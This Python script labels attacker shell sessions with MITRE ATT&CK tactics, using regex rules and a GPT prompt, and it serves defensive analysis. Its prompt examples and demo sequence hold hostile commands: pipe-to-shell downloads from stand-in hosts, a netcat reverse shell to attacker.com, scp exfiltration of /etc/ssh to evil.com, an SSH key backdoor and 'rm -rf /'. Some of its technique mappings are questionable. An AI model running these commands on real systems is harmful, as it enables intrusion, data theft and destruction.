import os
import openai
import json
from dotenv import load_dotenv
from tqdm import tqdm
import re
import base64
from typing import List, Dict, Any

# Load API key
load_dotenv()
openai.api_key = os.getenv("OPENAI_API_KEY")

# Paths
input_path = "data/full_supervised_corpus.json"  # Original dataset
#input_path = "data/vulns_sessions.json"  # Vulns_DB-derived dataset
output_path = "data/labeled_output.jsonl"
# Error log path
error_log_path = "data/labeling_errors.log"

# MITRE ATT&CK mapping (very basic, for demo)
MITRE_MAP = {
    'chmod': {'tactic': 'Defense Evasion', 'technique': 'T1222', 'desc': 'File and Directory Permissions Modification'},
    'useradd': {'tactic': 'Persistence', 'technique': 'T1136', 'desc': 'Create Account'},
    'passwd': {'tactic': 'Credential Access', 'technique': 'T1003', 'desc': 'OS Credential Dumping'},
    'wget': {'tactic': 'Command and Control', 'technique': 'T1105', 'desc': 'Ingress Tool Transfer'},
    'curl': {'tactic': 'Command and Control', 'technique': 'T1105', 'desc': 'Ingress Tool Transfer'},
    'bash': {'tactic': 'Execution', 'technique': 'T1059', 'desc': 'Command and Scripting Interpreter'},
    'sh': {'tactic': 'Execution', 'technique': 'T1059', 'desc': 'Command and Scripting Interpreter'},
    'echo': {'tactic': 'Persistence', 'technique': 'T1547', 'desc': 'Boot or Logon Autostart Execution'},
    'scp': {'tactic': 'Command and Control', 'technique': 'T1105', 'desc': 'Ingress Tool Transfer'},
    'eval': {'tactic': 'Execution', 'technique': 'T1059', 'desc': 'Command and Scripting Interpreter'},
    'base64': {'tactic': 'Defense Evasion', 'technique': 'T1140', 'desc': 'Deobfuscate/Decode Files or Information'},
    'cat': {'tactic': 'Discovery', 'technique': 'T1087', 'desc': 'Account Discovery'},
    'crontab': {'tactic': 'Persistence', 'technique': 'T1053', 'desc': 'Scheduled Task/Job'},
    'chpasswd': {'tactic': 'Credential Access', 'technique': 'T1003', 'desc': 'OS Credential Dumping'},
    'rm': {'tactic': 'Defense Evasion', 'technique': 'T1070', 'desc': 'Indicator Removal on Host'},
    'awk': {'tactic': 'Discovery', 'technique': 'T1087', 'desc': 'Account Discovery'},
    'top': {'tactic': 'Discovery', 'technique': 'T1082', 'desc': 'System Information Discovery'},
    'uname': {'tactic': 'Discovery', 'technique': 'T1082', 'desc': 'System Information Discovery'},
    'ls': {'tactic': 'Discovery', 'technique': 'T1083', 'desc': 'File and Directory Discovery'},
    'head': {'tactic': 'Discovery', 'technique': 'T1087', 'desc': 'Account Discovery'},
    'grep': {'tactic': 'Discovery', 'technique': 'T1087', 'desc': 'Account Discovery'},
    'cd': {'tactic': 'Discovery', 'technique': 'T1083', 'desc': 'File and Directory Discovery'},
    'mkdir': {'tactic': 'Persistence', 'technique': 'T1547', 'desc': 'Boot or Logon Autostart Execution'},
    'kill': {'tactic': 'Defense Evasion', 'technique': 'T1561', 'desc': 'Disk Wipe'},
    'ps': {'tactic': 'Discovery', 'technique': 'T1057', 'desc': 'Process Discovery'},
    'sleep': {'tactic': 'Defense Evasion', 'technique': 'T1497', 'desc': 'Virtualization/Sandbox Evasion'},
}

OBFUSCATION_PATTERNS = [
    (re.compile(r'base64 -d|base64 --decode'), 'base64'),
    (re.compile(r'echo [^|]+\| base64 -d'), 'base64'),
    (re.compile(r'eval '), 'eval'),
    (re.compile(r'bash -c'), 'bash-c'),
]

def deobfuscate_base64(cmd: str) -> str:
    match = re.search(r'echo\s+([A-Za-z0-9+/=]+)\s*\|\s*base64\s*-d', cmd)
    if match:
        try:
            decoded = base64.b64decode(match.group(1)).decode('utf-8', errors='replace')
            return decoded
        except Exception:
            return '[base64 decode error]'
    return ''

def parse_command(cmd: str) -> Dict[str, Any]:
    parts = cmd.strip().split()
    if not parts:
        return {}
    base = parts[0]
    params = [p for p in parts[1:] if p.startswith('-')]
    args = [a for a in parts[1:] if not a.startswith('-')]
    mitre = MITRE_MAP.get(base, None)
    obfuscation = None
    decoded = None
    for pattern, obf_type in OBFUSCATION_PATTERNS:
        if pattern.search(cmd):
            obfuscation = obf_type
            if obf_type == 'base64':
                decoded = deobfuscate_base64(cmd)
            break
    risk = 'High' if mitre and mitre['tactic'] in ['Persistence', 'Privilege Escalation', 'Command and Control', 'Defense Evasion'] else 'Medium' if mitre else 'Low'
    return {
        'base_command': base,
        'params': params,
        'args': args,
        'mitre_tactic': mitre['tactic'] if mitre else None,
        'mitre_technique': mitre['technique'] if mitre else None,
        'mitre_desc': mitre['desc'] if mitre else None,
        'risk': risk,
        'obfuscation': obfuscation,
        'decoded': decoded,
        'raw': cmd
    }

def analyze_sequence(sequence: str) -> List[Dict[str, Any]]:
    # Split on ; and && and | (but not inside quotes)
    commands = re.split(r'(?<![\w])(?:;|&&|\|)(?![\w])', sequence)
    return [parse_command(cmd) for cmd in commands if cmd.strip()]

def print_analysis(analysis: List[Dict[str, Any]]):
    for i, cmd in enumerate(analysis, 1):
        print(f'Command {i}: {cmd["raw"]}')
        print(f'  Base: {cmd["base_command"]}')
        print(f'  Params: {cmd["params"]}')
        print(f'  Args: {cmd["args"]}')
        if cmd['mitre_tactic']:
            print(f'  MITRE Tactic: {cmd["mitre_tactic"]} (TID: {cmd["mitre_technique"]}) - {cmd["mitre_desc"]}')
        else:
            print('  MITRE Tactic: [Not Mapped]')
        print(f'  Risk: {cmd["risk"]}')
        if cmd['obfuscation']:
            print(f'  Obfuscation Detected: {cmd["obfuscation"]}')
            if cmd['decoded']:
                print(f'    Decoded: {cmd["decoded"]}')
        print('-' * 60)

# Expanded prompt examples for LLM
PROMPT_EXAMPLES = [
    {
        "input": "scp -t /tmp/Muw3fuvA ; cd /tmp && chmod +x Muw3fuvA && bash -c ./Muw3fuvA ; ./Muw3fuvA ;",
        "output": {
            "tactics": ["Execution", "Persistence"],
            "techniques": ["Command and Scripting Interpreter (T1059)", "File and Directory Permissions Modification (T1222)", "Ingress Tool Transfer (T1105)"],
            "rationale": "Attacker transfers a file, makes it executable, and runs it, indicating persistence and execution.",
            "obfuscation_detected": False,
            "obfuscation_type": []
        }
    },
    {
        "input": "cat /proc/cpuinfo | grep name | wc -l ; echo root:jBohy6hcgerO | chpasswd | bash ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; cd ~ && rm -rf .ssh && mkdir .ssh && echo ssh-rsa ... >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ ;",
        "output": {
            "tactics": ["Execution", "Credential Access", "Discovery", "Persistence", "Privilege Escalation"],
            "techniques": ["OS Credential Dumping (T1003)", "Scheduled Task/Job (T1053)", "Account Discovery (T1087)", "File and Directory Discovery (T1083)", "Boot or Logon Autostart Execution (T1547)"],
            "rationale": "Session includes credential dumping, persistence via crontab, and discovery commands.",
            "obfuscation_detected": False,
            "obfuscation_type": []
        }
    },
    {
        "input": "scp -t /tmp/Uh64Sj3S ;",
        "output": {
            "tactics": ["Command and Control", "Exfiltration"],
            "techniques": ["Ingress Tool Transfer (T1105)"],
            "rationale": "File transfer to remote host, indicating C2 and possible exfiltration.",
            "obfuscation_detected": False,
            "obfuscation_type": []
        }
    },
    {
        "input": "echo c2VjcmV0IGNvbW1hbmQ= | base64 -d | bash",
        "output": {
            "tactics": ["Execution", "Defense Evasion"],
            "techniques": ["Deobfuscate/Decode Files or Information (T1140)", "Command and Scripting Interpreter (T1059)"],
            "rationale": "Base64 decoding and execution via bash, indicating obfuscation and execution.",
            "obfuscation_detected": True,
            "obfuscation_type": ["base64"]
        }
    },
    {
        "input": "unset HISTFILE; wget http://malicious.com/payload.sh -O- | sh",
        "output": {
            "tactics": ["Defense Evasion", "Execution", "Command and Control"],
            "techniques": ["Ingress Tool Transfer (T1105)", "Command and Scripting Interpreter (T1059)", "Indicator Removal on Host (T1070)"],
            "rationale": "Disables history, downloads and executes a payload, indicating evasion and C2.",
            "obfuscation_detected": False,
            "obfuscation_type": []
        }
    },
    {
        "input": "ps aux | grep sshd ; kill -9 1234",
        "output": {
            "tactics": ["Discovery", "Defense Evasion"],
            "techniques": ["Process Discovery (T1057)", "Indicator Removal on Host (T1070)"],
            "rationale": "Process listing and killing processes to evade detection.",
            "obfuscation_detected": False,
            "obfuscation_type": []
        }
    },
    {
        "input": "find / -name '*.log' -exec rm -f {} ;",
        "output": {
            "tactics": ["Defense Evasion"],
            "techniques": ["Indicator Removal on Host (T1070)"],
            "rationale": "Removes log files to evade detection.",
            "obfuscation_detected": False,
            "obfuscation_type": []
        }
    },
    {
        "input": "nc -e /bin/sh attacker.com 4444",
        "output": {
            "tactics": ["Command and Control", "Execution"],
            "techniques": ["Remote Access Tool (T1219)", "Command and Scripting Interpreter (T1059)"],
            "rationale": "Reverse shell for remote control.",
            "obfuscation_detected": False,
            "obfuscation_type": []
        }
    },
    {
        "input": "ssh -R 2222:localhost:22 attacker@evil.com",
        "output": {
            "tactics": ["Command and Control", "Initial Access"],
            "techniques": ["Remote Services (T1021)", "Valid Accounts (T1078)"],
            "rationale": "Establishes a reverse SSH tunnel for remote access.",
            "obfuscation_detected": False,
            "obfuscation_type": []
        }
    },
    {
        "input": "wget http://malicious.com/stealer.sh && chmod +x stealer.sh && ./stealer.sh && rm stealer.sh",
        "output": {
            "tactics": ["Command and Control", "Execution", "Defense Evasion"],
            "techniques": ["Ingress Tool Transfer (T1105)", "Command and Scripting Interpreter (T1059)", "Indicator Removal on Host (T1070)"],
            "rationale": "Downloads, executes, and removes a malicious script.",
            "obfuscation_detected": False,
            "obfuscation_type": []
        }
    },
    {
        "input": "tar czf secrets.tar.gz /etc/ssh && scp secrets.tar.gz attacker@evil.com:/tmp",
        "output": {
            "tactics": ["Collection", "Exfiltration"],
            "techniques": ["Archive Collected Data (T1560)", "Exfiltration Over Alternative Protocol (T1048)", "Ingress Tool Transfer (T1105)"],
            "rationale": "Sensitive files are archived and exfiltrated to a remote host, indicating collection and exfiltration tactics.",
            "obfuscation_detected": False,
            "obfuscation_type": []
        }
    },
    {
        "input": "rm -rf / --no-preserve-root",
        "output": {
            "tactics": ["Impact"],
            "techniques": ["Data Destruction (T1485)"],
            "rationale": "Destructive command to wipe the filesystem, indicating impact.",
            "obfuscation_detected": False,
            "obfuscation_type": []
        }
    },
]

def build_llm_prompt(session_text: str) -> str:
    prompt = (
        "You are a cybersecurity analyst specialized in identifying attacker behavior from shell commands.\n"
        "Your task: Analyze the session below and classify it by MITRE ATT&CK tactics and techniques.\n"
        "For each session, output a valid JSON object with the following fields:\n"
        "- 'tactics': list of observed MITRE ATT&CK tactics (consider ALL possible tactics, including rare or subtle ones)\n"
        "- 'techniques': list of observed MITRE ATT&CK techniques (with TIDs)\n"
        "- 'rationale': a short explanation of your reasoning\n"
        "- 'obfuscation_detected': true/false\n"
        "- 'obfuscation_type': list of obfuscation types detected (e.g., base64, eval, etc.)\n"
        "- 'confidence': a score from 0 (low) to 1 (high) for your prediction\n"
        "If you are uncertain, set a 'human_review' field to true.\n"
        "\n"
        "Be especially careful to identify rare tactics such as Exfiltration, Collection, Impact, and Command and Control, even if they appear only once.\n"
        "If you see evidence of data theft, remote access, or destructive actions, include those tactics.\n"
        "\n"
        "Examples:\n"
    )
    for ex in PROMPT_EXAMPLES:
        prompt += f"Input:\nSession:\n{ex['input']}\nOutput:\n{json.dumps(ex['output'], ensure_ascii=False)}\n\n"
    prompt += f"Input:\nSession:\n{session_text}\nOutput:"
    return prompt

# Updated classify_session to use new prompt and parse all required fields

def classify_session(session_text):
    prompt = build_llm_prompt(session_text)
    response = openai.ChatCompletion.create(
        model="gpt-4o-mini",
        messages=[
            {"role": "system", "content": "You are a cybersecurity analyst."},
            {"role": "user", "content": prompt}
        ],
        temperature=0.2,
        max_tokens=400
    )
    content = response['choices'][0]['message']['content']
    try:
        result = json.loads(content)
        # Ensure all required fields are present
        required_fields = ["tactics", "techniques", "rationale", "obfuscation_detected", "obfuscation_type", "human_review"]
        for f in required_fields:
            if f not in result:
                result[f] = [] if f in ["tactics", "techniques", "obfuscation_type"] else (False if f in ["obfuscation_detected", "human_review"] else "")
                result["human_review"] = True
        return result
    except json.JSONDecodeError:
        # Try to extract JSON from response
        start = content.find('{')
        end = content.rfind('}') + 1
        if start != -1 and end != -1:
            try:
                result = json.loads(content[start:end])
                required_fields = ["tactics", "techniques", "rationale", "obfuscation_detected", "obfuscation_type", "human_review"]
                for f in required_fields:
                    if f not in result:
                        result[f] = [] if f in ["tactics", "techniques", "obfuscation_type"] else (False if f in ["obfuscation_detected", "human_review"] else "")
                        result["human_review"] = True
                return result
            except Exception:
                pass
        print("Warning: Invalid JSON from LLM. Returning raw content.")
        return {
            "tactics": [],
            "techniques": [],
            "rationale": "[LLM output error]", 
            "obfuscation_detected": False,
            "obfuscation_type": [],
            "human_review": True,
            "llm_raw": content
        }

def analyze_mitre_and_obfuscation(sequence: str) -> dict:
    tactics = set()
    techniques = set()
    obfuscation_types = set()
    obfuscation_detected = False
    # MITRE technique patterns
    technique_patterns = [
        (re.compile(r'\b(sh|bash|python|perl|ruby|pwsh|powershell|cmd)\b'), ('Command-Line Interface', 'T1059', 'Execution')),
        (re.compile(r'\b(crontab|schtasks)\b'), ('Scheduled Task', 'T1053', 'Persistence')),
        (re.compile(r'base64\s+-d|base64\s+--decode|xxd|openssl enc'), ('Deobfuscate/Decode', 'T1140', 'Defense Evasion')),
        (re.compile(r'\b(cat|grep|awk|cut|sort|uniq|head|tail)\b.*(/etc/shadow|/etc/passwd|SAM|SYSTEM|SECURITY|mimikatz)', re.I), ('Credential Dumping', 'T1003', 'Credential Access')),
        (re.compile(r'/dev/shm/|\.[a-zA-Z0-9]{1,4}\b'), ('Masquerading', 'T1036', 'Defense Evasion')),
    ]
    # Obfuscation patterns
    obf_patterns = [
        (re.compile(r'base64\s+-d|base64\s+--decode'), 'base64'),
        (re.compile(r'echo\s+-e\s+"?\\x[0-9a-fA-F]{2}'), 'hex encoding'),
        (re.compile(r'\|\s*(sh|bash|python|perl|ruby|pwsh|powershell|cmd)'), 'pipe-to-shell'),
        (re.compile(r'eval|exec'), 'dynamic execution'),
        (re.compile(r'unset HISTFILE|set \+o history'), 'history clearing'),
        (re.compile(r'/dev/shm/|\.[a-zA-Z0-9]{1,4}\b'), 'fileless/hidden payload'),
    ]
    for pat, (tech, tid, tactic) in technique_patterns:
        if pat.search(sequence):
            techniques.add(f"{tech} ({tid})")
            tactics.add(tactic)
    for pat, obf_type in obf_patterns:
        if pat.search(sequence):
            obfuscation_types.add(obf_type)
            obfuscation_detected = True
    return {
        "tactics": sorted(list(tactics)),
        "techniques": sorted(list(techniques)),
        "obfuscation_detected": obfuscation_detected,
        "obfuscation_type": sorted(list(obfuscation_types))
    }

def main():
    # Check that input file exists
    if not os.path.exists(input_path):
        print(f"Input file not found: {input_path}")
        return

    error_log_path = "data/labeling_errors.log"
    # Open input and output files
    with open(input_path, "r", encoding="utf-8") as infile, \
         open(output_path, "w", encoding="utf-8") as outfile, \
         open(error_log_path, "w", encoding="utf-8") as errfile:
        data = json.load(infile)
        output_data = []
        # Support both dict (original) and list (vulns_sessions.json) input
        if isinstance(data, dict):
            data_iter = data.values()
        else:
            data_iter = data
        for d in data_iter:
            try:
                session_text = d.get("session", "") or d.get("commands", "")
                if not session_text:
                    msg = f"Skipping entry with no 'session' or 'commands': {d}\n"
                    print(msg)
                    errfile.write(msg)
                    continue
                print("\nProcessing session:", session_text[:100])
                llm_result = classify_session(session_text)
                static_result = analyze_sequence(session_text)
                d["llm_labels"] = llm_result
                d["static_analysis"] = static_result
                output_data.append(d)
            except Exception as e:
                msg = f"Error labeling session: {e} | Data: {d}\n"
                print(msg)
                errfile.write(msg)
                continue
        json.dump(output_data, outfile, indent=2)

    print("\n Labeling complete. Output saved to:", output_path)
    print("Errors (if any) logged to:", error_log_path)

    # Example command sequence for automated analysis
    example_sequence = (
        "curl http://malicious.com/malware.sh | sh; "
        "useradd attacker && passwd attacker 12345; "
        "echo 'evil backdoor' > /etc/init.d/backdoor; "
        "wget http://badsite.com/evil.sh -O- | bash; "
        "chmod +x /tmp/malware && /tmp/malware"
    )
    print("\n--- MITRE ATT&CK and Obfuscation Analysis for Example Sequence ---")
    print(example_sequence)
    result = analyze_mitre_and_obfuscation(example_sequence)
    print(json.dumps(result, indent=2))
    # Save the analysis to the JSONL file
    with open(output_path, "a", encoding="utf-8") as outfile:
        outfile.write(json.dumps({
            "example_sequence": example_sequence,
            "mitre_obfuscation_analysis": result
        }) + "\n")

if __name__ == "__main__":
    main()
